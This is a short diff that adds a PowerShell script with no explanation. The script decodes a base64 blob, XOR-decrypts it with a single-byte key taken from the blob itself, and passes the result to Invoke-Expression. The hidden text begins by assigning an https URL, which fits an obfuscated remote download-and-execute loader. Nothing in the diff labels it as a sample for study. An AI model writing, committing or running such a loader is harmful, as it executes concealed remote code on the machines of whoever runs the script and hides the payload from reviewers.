@@ -1,0 +1,6 @@
+$e='wOSk/eeotLSws/rv77Cysqm0s6Oy7qOvre+ztbS1sO6luKXn++DksP3kpa62+pSFjZDr55yz7qW4pef74OiOpbftj6KqpaO04I6ltO6XpaKDrKmlrrTp7oSvt66sr6GkhqmspejkpOzksOn74JO0obK07ZCyr6Ols7Pg5LDg7ZeprqSvt5O0uayl4IippKSlrg=='
+$b=[Convert]::FromBase64String($e)
+$k=$b[0]
+$d=$b[1..($b.Length-1)]
+0..($d.Length-1)|%{$d[$_]=$d[$_]-bxor$k}
+iex([Text.Encoding]::UTF8.GetString($d))
